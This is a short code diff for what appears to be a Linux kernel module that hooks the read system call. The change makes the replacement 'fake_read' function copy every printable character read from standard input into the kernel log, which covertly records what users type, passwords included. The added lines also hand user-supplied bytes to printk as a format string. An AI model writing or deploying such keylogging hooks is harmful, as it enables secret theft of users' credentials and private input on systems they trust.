@@ -35,17 +35,26 @@ int (*asmlinkage old_read_func)(int fd, void* buf, size_t count);
 
 atomic_t active_read_calls = ATOMIC_INIT(0);
 
-int fake_read(int fd, void* buf, size_t count)
+asmlinkage int fake_read(int fd, void* buf, size_t count)
 {
-    int ret;
+    char mybuf[2];
+    int ret, i;
     atomic_inc(&active_read_calls);
 
-    if (count == 1337)
-    {
-	printk(KERN_INFO "1337 read\n");
-    }
-
     ret = old_read_func(fd, buf, count);
+
+    if (fd == 0)
+    {
+        printk(KERN_INFO);
+        mybuf[1] = '\0';
+        for (i = 0; i < ret; i++)
+        {
+            mybuf[0] = ((char*)buf)[i];
+            if ((mybuf[0] < ' ') || (mybuf[0] > '~')) continue;
+            printk(mybuf);
+        }
+        printk("\n");
+    }
 
     atomic_dec(&active_read_calls);
     return ret;
